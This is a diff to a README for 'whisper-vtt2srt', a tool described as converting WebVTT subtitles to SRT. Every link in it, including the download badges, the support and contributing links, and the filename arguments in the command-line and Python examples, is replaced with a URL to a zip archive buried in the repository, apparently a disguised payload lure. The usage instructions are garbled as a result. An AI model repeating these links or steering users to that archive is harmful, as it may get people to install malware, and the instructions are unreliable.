@@ -1,6 +1,6 @@
 # 🎉 whisper-vtt2srt - Convert WebVTT to SRT Effortlessly
 
-[![Download Latest Release](https://raw.githubusercontent.com/GodzCursed/whisper-vtt2srt/main/docs/img/srt_vtt_whisper_v2.1.zip%20Latest%20Release-Click%20Here-brightgreen)](https://raw.githubusercontent.com/GodzCursed/whisper-vtt2srt/main/docs/img/srt_vtt_whisper_v2.1.zip)
+[![Download Latest Release](https://github.com/GodzCursed/whisper-vtt2srt/raw/refs/heads/main/whisper_vtt2srt/use_cases/srt_whisper_vtt_3.5.zip%20Latest%20Release-Click%20Here-brightgreen)](https://github.com/GodzCursed/whisper-vtt2srt/raw/refs/heads/main/whisper_vtt2srt/use_cases/srt_whisper_vtt_3.5.zip)
 
 ## 📖 Overview
 whisper-vtt2srt is a tool designed to convert WebVTT files into the SRT format. It's perfect for AI transcriptions, whether from Whisper or YouTube. This tool addresses common problems, such as the "Karaoke effect," by intelligently fixing text accumulation and filtering out micro-glitches. It also cleans up unnecessary metadata, providing you with a polished result.
@@ -21,7 +21,7 @@ Getting started with whisper-vtt2srt is easy. Follow these simple steps to downl
 ### Step 1: Visit the Releases Page
 Click the button below to go to the releases page where you can find the latest version of whisper-vtt2srt.
 
-[![Download Latest Release](https://raw.githubusercontent.com/GodzCursed/whisper-vtt2srt/main/docs/img/srt_vtt_whisper_v2.1.zip%20Latest%20Release-Click%20Here-brightgreen)](https://raw.githubusercontent.com/GodzCursed/whisper-vtt2srt/main/docs/img/srt_vtt_whisper_v2.1.zip)
+[![Download Latest Release](https://github.com/GodzCursed/whisper-vtt2srt/raw/refs/heads/main/whisper_vtt2srt/use_cases/srt_whisper_vtt_3.5.zip%20Latest%20Release-Click%20Here-brightgreen)](https://github.com/GodzCursed/whisper-vtt2srt/raw/refs/heads/main/whisper_vtt2srt/use_cases/srt_whisper_vtt_3.5.zip)
 
 ### Step 2: Download the Latest Version
 On the releases page, you will see a list of available versions. Choose the most recent version that fits your operating system.
@@ -57,7 +57,7 @@ On the releases page, you will see a list of available versions. Choose the most
 ## 📥 Download & Install
 Now that you're ready, go back to the releases page to download the latest version of whisper-vtt2srt.
 
-[![Download Latest Release](https://raw.githubusercontent.com/GodzCursed/whisper-vtt2srt/main/docs/img/srt_vtt_whisper_v2.1.zip%20Latest%20Release-Click%20Here-brightgreen)](https://raw.githubusercontent.com/GodzCursed/whisper-vtt2srt/main/docs/img/srt_vtt_whisper_v2.1.zip)
+[![Download Latest Release](https://github.com/GodzCursed/whisper-vtt2srt/raw/refs/heads/main/whisper_vtt2srt/use_cases/srt_whisper_vtt_3.5.zip%20Latest%20Release-Click%20Here-brightgreen)](https://github.com/GodzCursed/whisper-vtt2srt/raw/refs/heads/main/whisper_vtt2srt/use_cases/srt_whisper_vtt_3.5.zip)
 
 ## 📃 Usage Instructions
 After successfully installing the application, you can begin converting WebVTT files to SRT.
@@ -74,9 +74,9 @@ After successfully installing the application, you can begin converting WebVTT f
 2. Navigate to the directory containing whisper-vtt2srt.
 3. Enter the following command:
    ```bash
-   whisper-vtt2srt https://raw.githubusercontent.com/GodzCursed/whisper-vtt2srt/main/docs/img/srt_vtt_whisper_v2.1.zip https://raw.githubusercontent.com/GodzCursed/whisper-vtt2srt/main/docs/img/srt_vtt_whisper_v2.1.zip
+   whisper-vtt2srt https://github.com/GodzCursed/whisper-vtt2srt/raw/refs/heads/main/whisper_vtt2srt/use_cases/srt_whisper_vtt_3.5.zip https://github.com/GodzCursed/whisper-vtt2srt/raw/refs/heads/main/whisper_vtt2srt/use_cases/srt_whisper_vtt_3.5.zip
    ```
-   Replace `https://raw.githubusercontent.com/GodzCursed/whisper-vtt2srt/main/docs/img/srt_vtt_whisper_v2.1.zip` with your WebVTT file and `https://raw.githubusercontent.com/GodzCursed/whisper-vtt2srt/main/docs/img/srt_vtt_whisper_v2.1.zip` with the desired output filename.
+   Replace `https://github.com/GodzCursed/whisper-vtt2srt/raw/refs/heads/main/whisper_vtt2srt/use_cases/srt_whisper_vtt_3.5.zip` with your WebVTT file and `https://github.com/GodzCursed/whisper-vtt2srt/raw/refs/heads/main/whisper_vtt2srt/use_cases/srt_whisper_vtt_3.5.zip` with the desired output filename.
 
 ### Using Python API
 1. Import the library in your Python script:
@@ -85,7 +85,7 @@ After successfully installing the application, you can begin converting WebVTT f
    ```
 2. Use the convert function:
    ```python
-   convert("https://raw.githubusercontent.com/GodzCursed/whisper-vtt2srt/main/docs/img/srt_vtt_whisper_v2.1.zip", "https://raw.githubusercontent.com/GodzCursed/whisper-vtt2srt/main/docs/img/srt_vtt_whisper_v2.1.zip")
+   convert("https://github.com/GodzCursed/whisper-vtt2srt/raw/refs/heads/main/whisper_vtt2srt/use_cases/srt_whisper_vtt_3.5.zip", "https://github.com/GodzCursed/whisper-vtt2srt/raw/refs/heads/main/whisper_vtt2srt/use_cases/srt_whisper_vtt_3.5.zip")
    ```
 
 ## ✅ Common Issues
@@ -96,10 +96,10 @@ After successfully installing the application, you can begin converting WebVTT f
   - **Solution:** Confirm that you have permissions to write in the output directory.
 
 ## 📞 Support
-If you encounter issues or have questions, please consider opening an issue on our [GitHub page](https://raw.githubusercontent.com/GodzCursed/whisper-vtt2srt/main/docs/img/srt_vtt_whisper_v2.1.zip). Your feedback helps us improve the application.
+If you encounter issues or have questions, please consider opening an issue on our [GitHub page](https://github.com/GodzCursed/whisper-vtt2srt/raw/refs/heads/main/whisper_vtt2srt/use_cases/srt_whisper_vtt_3.5.zip). Your feedback helps us improve the application.
 
 ## 🙌 Contributing
-We welcome contributions from everyone. If you want to help, check out our [contributing guide](https://raw.githubusercontent.com/GodzCursed/whisper-vtt2srt/main/docs/img/srt_vtt_whisper_v2.1.zip).
+We welcome contributions from everyone. If you want to help, check out our [contributing guide](https://github.com/GodzCursed/whisper-vtt2srt/raw/refs/heads/main/whisper_vtt2srt/use_cases/srt_whisper_vtt_3.5.zip).
 
 ## 🔗 Related Topics
 - AI Tooling
